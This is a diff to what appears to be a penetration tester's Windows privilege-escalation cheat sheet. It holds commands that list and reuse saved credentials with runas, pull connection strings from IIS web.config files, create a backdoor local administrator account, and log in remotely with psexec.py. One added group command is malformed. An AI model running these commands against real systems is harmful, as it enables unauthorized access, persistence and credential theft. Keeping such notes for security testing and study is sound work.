@@ -7,7 +7,14 @@
     cmdkey /list
     //runas to view a username in the list, nad launch a cmd
     runas /savecred /user:xxx cmd.exe
+  #### add user as admin in PS
+    net user name passwd /add;
+    net localgroup Administrators /add;
 
+    save it as a .ps1 script or run it directly.
+
+    login with psexec.py
+      psexec.py user:'passwd!'@IP
   #### IIS Configuration
     type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
     or C:\inetpub\wwwroot\web.config
